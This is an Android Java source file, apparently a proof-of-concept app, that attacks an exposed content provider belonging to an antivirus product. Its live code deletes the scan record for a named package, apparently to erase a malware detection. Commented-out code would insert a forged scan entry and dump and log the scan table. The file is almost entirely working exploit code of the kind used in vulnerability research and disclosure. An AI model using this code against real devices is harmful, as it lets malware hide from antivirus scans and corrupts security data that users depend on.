package com.wnagzihxa1n.pocapk;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import java.io.FileInputStream;
import java.util.ArrayList;

public class MainActivity extends Activity {

    static final String TAG = "toT0C";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = null;
        try {

            Uri uri_query = Uri.parse("content://com.antiy.avlpro.MyProvider");
            contentResolver.delete(uri_query, "pkg_name='com.zxfxxx660.sucruri'", null);
//            // insert data to table scan_info
//            ContentValues contentValues = new ContentValues();
//            contentValues.put("scan_path", "/data/app/com.android.camera-1.apk");
//            contentValues.put("scan_result", "2");
//            contentValues.put("v_name", "null");
//            contentValues.put("v_description", "null");
//            contentValues.put("pkg_name", "com.android.camera");
//            contentValues.put("scan_date", "2018/01/31");
//            contentValues.put("exist_flag", "0");
//            contentValues.put("app_name", "Camera");
//            contentValues.put("app_version", "1.0.0");
//            contentValues.put("create_time", "null");
//            contentValues.put("white", "null");
//            contentValues.put("adware", "null");
//            contentValues.put("payware", "null");
//            contentValues.put("pack", "null");
//            contentResolver.insert(uri_query, contentValues);
//            // query the data from table scan_info
//            cursor = contentResolver.query(uri_query,
//                    new String[]{
//                            "scan_path",
//                            "scan_result",
//                            "v_name",
//                            "v_description",
//                            "pkg_name",
//                            "scan_date",
//                            "exist_flag",
//                            "app_name",
//                            "app_version",
//                            "create_time",
//                            "white",
//                            "adware",
//                            "payware",
//                            "pack"},
//                    null, null, null);
//            while (cursor.moveToNext()) {
//                if (cursor != null) {
//                    String scan_path = cursor.getString(cursor.getColumnIndex("scan_path"));
//                    String scan_result = cursor.getString(cursor.getColumnIndex("scan_result"));
//                    String v_name = cursor.getString(cursor.getColumnIndex("v_name"));
//                    String v_description = cursor.getString(cursor.getColumnIndex("v_description"));
//                    String pkg_name = cursor.getString(cursor.getColumnIndex("pkg_name"));
//                    String scan_date = cursor.getString(cursor.getColumnIndex("scan_date"));
//                    String exist_flag = cursor.getString(cursor.getColumnIndex("exist_flag"));
//                    String app_name = cursor.getString(cursor.getColumnIndex("app_name"));
//                    String app_version = cursor.getString(cursor.getColumnIndex("app_version"));
//                    String create_time = cursor.getString(cursor.getColumnIndex("create_time"));
//                    String white = cursor.getString(cursor.getColumnIndex("white"));
//                    String adware = cursor.getString(cursor.getColumnIndex("adware"));
//                    String payware = cursor.getString(cursor.getColumnIndex("payware"));
//                    String pack = cursor.getString(cursor.getColumnIndex("pack"));
//                    Log.i(TAG, "scan_path:" + scan_path);
//                    Log.i(TAG, "scan_result:" + scan_result);
//                    Log.i(TAG, "v_name:" + v_name);
//                    Log.i(TAG, "v_description:" + v_description);
//                    Log.i(TAG, "pkg_name:" + pkg_name);
//                    Log.i(TAG, "scan_date:" + scan_date);
//                    Log.i(TAG, "exist_flag:" + exist_flag);
//                    Log.i(TAG, "app_name:" + app_name);
//                    Log.i(TAG, "app_version:" + app_version);
//                    Log.i(TAG, "create_time:" + create_time);
//                    Log.i(TAG, "white:" + white);
//                    Log.i(TAG, "adware:" + adware);
//                    Log.i(TAG, "payware:" + payware);
//                    Log.i(TAG, "pack:" + pack);
//                }
//            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}